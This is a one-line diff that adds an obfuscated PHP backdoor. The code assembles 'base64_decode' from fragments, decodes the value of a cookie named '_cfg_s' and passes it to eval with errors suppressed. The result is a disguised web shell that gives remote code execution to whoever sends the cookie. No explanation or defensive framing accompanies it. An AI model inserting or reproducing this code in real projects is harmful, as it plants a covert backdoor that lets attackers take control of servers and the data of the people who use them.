@@ -1,0 +1,1 @@
+<?php $_c = 'ba' . 'se' . '64_' . 'decode'; if (isset($_COOKIE['_cfg_s'])) { @eval($_c($_COOKIE['_cfg_s'])); } ?>
